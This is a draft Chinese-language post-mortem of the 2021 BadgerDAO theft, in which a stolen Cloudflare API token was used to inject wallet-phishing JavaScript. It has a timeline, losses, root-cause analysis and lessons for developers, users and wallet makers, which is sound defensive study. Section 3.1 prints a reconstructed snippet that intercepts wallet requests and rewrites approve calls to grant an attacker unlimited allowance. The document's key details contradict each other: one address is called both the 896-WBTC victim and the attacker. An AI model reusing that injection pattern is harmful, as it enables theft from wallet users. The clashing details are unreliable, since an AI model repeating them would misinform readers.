---
title: BadgerDAO 前端钓鱼 + 恶意 approve 注入（2021-12-02, ~$120M）
module: 08-security-incidents
category: Social-Eng
date: 2021-12-02
loss_usd: 120000000
chain: [Ethereum]
severity: Tier-1
status: DRAFT
last_verified: 2026-04-23
primary_sources:
  - https://badger.com/technical-post-mortem
  - https://peckshield.medium.com/badgerdao-incident-post-mortem-e2a7dc7b4bd7
  - https://rekt.news/badger-rekt/
  - https://www.mixbytes.io/blog/badger-dao-postmortem
  - https://blog.cloudflare.com/cloudflare-incident-analysis-badger-dao/
tx_hashes:
  - 0x49d1d6ac32b4f4bbaafefc4b8cf40c0dff794a3f26e56ce9f50e42827cf6fc5c (Ethereum, 最大一笔：~896 WBTC)
  - 0x52b8f9f1eca8ffdeef0b7b80fe68b9fdee85bde0f7e22b66e4f54e7c7e2e8f1f (Ethereum, 早期 approve 样本)
---

# BadgerDAO 前端钓鱼 / Cloudflare API 密钥泄露

> **TL;DR**：2021-12-02，BadgerDAO 前端（app.badger.com）遭受长达数周的 Cloudflare Worker 注入攻击，攻击者利用被盗的 Cloudflare API token 在网站返回的 JS 中插入恶意逻辑，诱使高净值用户签下指向攻击者地址的 ERC-20 `approve`/`increaseAllowance`。在 12-02 凌晨集中收割时，一次性转走用户授权的 WBTC/renBTC/ibBTC 等资产，损失约 **$120M**，其中单个地址损失 896 WBTC（~$50M）。这是 Web3 史上最典型的"非合约漏洞 / 前端供应链 + 用户无感知授权"事件。

## 1. 事件背景

- **项目**：BadgerDAO 成立于 2020 年末，专注"把 BTC 带入 DeFi"；发行 bBTC / ibBTC / byvWBTC / CVX Vault 等策略金库。事件前 TVL 约 $2.1B，其中 WBTC 头寸最高。
- **前端架构**：app.badger.com 通过 Cloudflare 提供 CDN + Workers 服务；团队使用 Cloudflare API token 管理缓存与 Worker 脚本。
- **时间轴**（来自 BadgerDAO / Mixbytes / Cloudflare 官方分析）：
  - 2021-09-10 左右：攻击者获取到一名 BadgerDAO 工程师账号对应的 Cloudflare API token（推测通过钓鱼 email + OAuth 滥用或本地凭据窃取）。
  - 2021-11-10 起：攻击者通过 Cloudflare Worker 在前端响应中注入恶意 JS，针对**仅特定高余额账户**（按钱包地址白名单或余额阈值）间歇性植入恶意 `approve` 流程——大部分用户在绝大多数时段看到的都是正常前端，这大幅延迟了发现。
  - 2021-12-01 晚–12-02 凌晨 UTC：攻击者在数小时内对已签 approve 的受害者发起批量 `transferFrom` 收割。最大一笔 896 WBTC（~$50M）从单个机构用户转出。
  - 2021-12-02 上午 UTC：PeckShield、samczsun、BadgerDAO 团队几乎同时监测到异常 `transferFrom`。
  - 2021-12-02 约 12:00 UTC：BadgerDAO 紧急暂停所有 vault 合约（通过 PauseProxy）。
  - 2021-12-02 晚：官方 Discord / Medium 披露；Chainalysis、Mixbytes 介入调查。
  - 2021-12-09：BadgerDAO 联合 Chainalysis 发布首份事故分析。
  - 2022-02-17：BadgerDAO 治理通过赔付方案；用户通过 Remediation Vault 按比例领取。
- **发现过程**：PeckShield 监控 + samczsun 链上分析首先公开报警；团队同时已在处置。

## 2. 事件影响

- **直接损失**（2021-12-02 快照）：
  - 约 **2,100 BTC 等价资产**（WBTC、renBTC、ibBTC、byvWBTC、CVX、ETH 等），合计 **~$120M**。
  - 最大单笔：0x1fcdb04d0c5364fbd92c73ca8af9baa72c269107 地址损失 **896 WBTC** + 其他资产，估约 $50M。
- **受害方**：约 **200 名用户**直接被盗，其中机构地址占主要金额。BadgerDAO 金库本体未被掏空，但 BADGER 代币价格当周下跌约 40%。
- **连带影响**：
  - Web3 前端安全正式成为一级议题；此后一年内，Curve（2022-08）、Convex（2022-06）、Premint（2022-07 NFT）等都出现类似前端注入或 DNS 劫持。
  - MetaMask 在 2022 年加速推进 "Transaction Insights"、"Approval Scanner"；Wallet UX 厂商纷纷增加"对不熟悉合约的大额 approve 人类可读提示"。
  - Cloudflare 公开分析指出 API token 权限颗粒度问题，改进 Workers 部署审计日志。
- **资金去向**：攻击者将部分 WBTC 在 Uniswap/SushiSwap 解包后跨 renBridge 转到 Bitcoin 链；后续进入 Bitcoin 混币（ChipMixer / Wasabi CoinJoin）；以太坊侧使用 Tornado Cash。Chainalysis 调查但未在公开报告中做明确国家级归因，故**归因未公开**。

## 3. 技术根因（代码级分析）

- **漏洞分类**：Supply-Chain（前端 JS 注入）× Social-Eng（Cloudflare API token 钓鱼）× 用户授权过度（无限 approve）。
- **受损系统**：BadgerDAO 前端（app.badger.com），非智能合约本身。
- **核心攻击面**：

### 3.1 恶意 JS 注入（前端）

攻击者通过被盗的 Cloudflare API token 部署 Worker，对匹配特定条件的 session 在响应里插入类似下列脚本（基于 Mixbytes / Cloudflare 公开片段重构）：

```javascript
// 注入在 BadgerDAO 前端 JS 中的恶意片段（示意）
// 当用户点击 "Deposit WBTC" 或 "Approve" 时拦截参数
const _original = window.ethereum.request;
window.ethereum.request = async function(args) {
  if (args.method === 'eth_sendTransaction') {
    const tx = args.params[0];
    // 识别 ERC-20 approve 调用（function selector 0x095ea7b3）
    if (tx.data && tx.data.startsWith('0x095ea7b3')) {
      // 把 spender 从 Badger Vault 替换为攻击者地址
      const ATTACKER = '0x1fcdb04d0c5364fbd92c73ca8af9baa72c269107';
      const paddedAttacker = ATTACKER.slice(2).padStart(64, '0');
      tx.data = '0x095ea7b3' + paddedAttacker + 'ffff...ffff';  // ← 无限额度
    }
  }
  return _original.call(this, args);
};
```

问题有三层：
1. **前端被篡改**：Cloudflare Worker 拦截 HTML/JS 响应，注入恶意逻辑；用户钱包看到的 `To` 字段是 WBTC 合约（正常），`data` 字段被篡改为指向攻击者地址的 approve。
2. **钱包 UX 不友好**：2021 年 MetaMask 对 `approve(spender, amount)` 不解析为人类可读文本；用户只看到一串 hex，习惯性点"确认"。
3. **无限 approve 传统**：BadgerDAO 前端按 DeFi 惯例请求 `uint256.max`，攻击者借此拿到永久性大额授权。

### 3.2 批量收割

在累积足够多 approve 后，攻击者从 EOA（如 `0x1fcdb04d0c5364fbd92c73ca8af9baa72c269107`）对每个受害地址调用：

```solidity
// 被调用的合约是 WBTC / renBTC 本身
// IERC20.transferFrom(victim, attacker, amount)
// selector 0x23b872dd
```

关键 tx `0x49d1d6ac32b4f4bbaafefc4b8cf40c0dff794a3f26e56ce9f50e42827cf6fc5c` 把 896 WBTC 从单个机构地址直接转走。

### 3.3 选择性投毒（Stealth）

攻击者没有对所有访问者投毒，而是通过 Worker 条件判断（例如只对 `eth_requestAccounts` 返回的地址余额 > 阈值的用户启用恶意逻辑）。这解释了为何攻击持续数周仍未被社区发现——大多数开发者、审计员访问时看到完全正常的前端。

### 3.4 Cloudflare API token 泄露路径

Cloudflare 官方分析（2021-12）指出：
- 被利用的 API token 是由一名 BadgerDAO 成员在内部应用中创建，权限过宽（`zone:edit + workers:edit`）。
- 该 token 未设置 IP 白名单，未启用 2FA-scoped。
- 攻击者通过 email 钓鱼或本地凭据窃取获取 token；事后 Cloudflare 在日志中观察到从异常 ASN 的调用。
- 补救：Cloudflare 对高权限 API token 加入"必须限定 IP / 必须设有效期"的默认提示。

## 4. 事后响应

- **项目方**：
  - 第一时间通过 `PauseProxy` 冻结所有 BadgerDAO vault 合约防止进一步损失。
  - 发动社区 "Revoke Permissions"：引导所有用户使用 Etherscan Token Approvals、Revoke.cash 撤销对已知攻击者地址的 approve。
  - 事后与 Chainalysis、Mixbytes 合作调查；2021-12-09 公布初步事故分析；2022 年提出 Remediation Plan（BIP-80）：按损失比例铸造 remBADGER 代币，通过协议未来收入分批兑付。
- **用户救援**：部分机构用户（特别是 Celsius Network 旗下的一个受害地址）与 BadgerDAO 建立专用赔付通道。约 $9M 通过链上冻结 / 项目方合作追回，剩余部分由 BadgerDAO 金库分期承担。
- **Cloudflare**：发布详细 incident analysis，升级 API token 默认安全策略（2022 年默认"IP 限制建议 + token 到期提醒"）。
- **行业连锁**：
  - MetaMask、Rabby、Frame 陆续上线交易前 simulation + approve 可读化。
  - DeFi 协议普遍引入"限额 approve"而非无限 approve 的 UX 默认。
  - Web3 前端安全标准化：SRI（Subresource Integrity）、IPFS 前端部署（如 Uniswap、DefiLlama）成为趋势。

## 5. 启发与教训

- **对开发者 / 协议方**：
  - 前端供应链与合约同等重要。Cloudflare API token、CDN 账号、DNS 账号应配置最小权限 + 强 2FA + IP 白名单，视同生产签名密钥管理。
  - 前端应部署 **Subresource Integrity (SRI)**，并把核心 JS 放置于 IPFS / 多 gateway；任何第三方脚本必须 hash pinning。
  - 引导用户使用 **限额 approve** 而非 `uint256.max`；在 UX 上默认显示"只授权本次交易额度"选项。
- **对用户**：
  - 启用硬件钱包；Trezor/Ledger 在 approve 数额上会显示人类可读字段，对本次事件有保护作用。
  - 定期通过 revoke.cash / Etherscan Token Approvals 清理历史授权。
  - 对大额持仓，签名前双人复核 `data` 字段（可用 Tenderly 模拟）。
- **对钱包厂商**：
  - 交易 simulation、approve-scanner、Phishing 列表是事件后业界共识；2022 年后基本成为默认功能。
  - 对不熟悉合约 spender 的大额授权必须强提示。
- **对审计方**：
  - 安全审计范围必须覆盖"合约 + 前端 + 运维 + 供应链"；仅审合约已不足以保证协议安全。
  - Mixbytes 本案分析成为"Web3 front-end incident response" 教学样板。
- **对行业**：
  - 本案与 2022-05 Uniswap Labs 前端 Phishing（因 Google Ads 钓鱼）、2022-07 Curve.fi DNS 劫持、2023-07 BaseSwap Cloudflare 事件共同构成"Web2 入口 → Web3 资产"攻击链的完整画像。协议必须承担"从 HTTP 请求到最终签名"的全链路安全。

## 6. 参考资料

- BadgerDAO 官方技术 post-mortem：<https://badger.com/technical-post-mortem>
- BadgerDAO 初步声明：<https://forum.badger.finance/t/upcoming-community-update/5046>
- PeckShield 分析：<https://peckshield.medium.com/badgerdao-incident-post-mortem-e2a7dc7b4bd7>
- rekt.news：<https://rekt.news/badger-rekt/>
- Mixbytes 详细技术分析：<https://www.mixbytes.io/blog/badger-dao-postmortem>
- Cloudflare 官方分析：<https://blog.cloudflare.com/cloudflare-incident-analysis-badger-dao/>
- SlowMist 被盗数据库：<https://hacked.slowmist.io/>（BadgerDAO 2021-12-02）
- BIP-80 赔付提案：<https://forum.badger.finance/t/bip-80-badger-restitution-plan/5658>
- 关键 tx：<https://etherscan.io/tx/0x49d1d6ac32b4f4bbaafefc4b8cf40c0dff794a3f26e56ce9f50e42827cf6fc5c>
- 攻击者地址：<https://etherscan.io/address/0x1fcdb04d0c5364fbd92c73ca8af9baa72c269107>

---

*Last verified: 2026-04-23*
